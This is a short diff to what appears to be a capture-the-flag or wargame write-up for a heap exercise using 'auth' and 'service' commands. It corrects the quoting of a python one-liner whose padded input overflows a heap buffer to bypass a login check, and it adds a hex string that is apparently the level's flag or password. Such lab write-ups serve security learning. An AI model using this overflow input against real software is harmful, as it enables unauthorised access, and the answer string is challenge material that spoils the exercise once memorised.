@@ -14,6 +14,8 @@ At this point we can either do another strdup to move another 0x10 and hit the c
 
 python -c "print("auth " + "\n" + "service" + "123456789012345" + "\x0")
 
-python -c "print("auth " + "\n" + "service" + "123456789012345" + "1")
+python -c 'print("auth " + "\n" + "service" + "123456789012345" + "1")'
 
 and now login works gg 
+
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
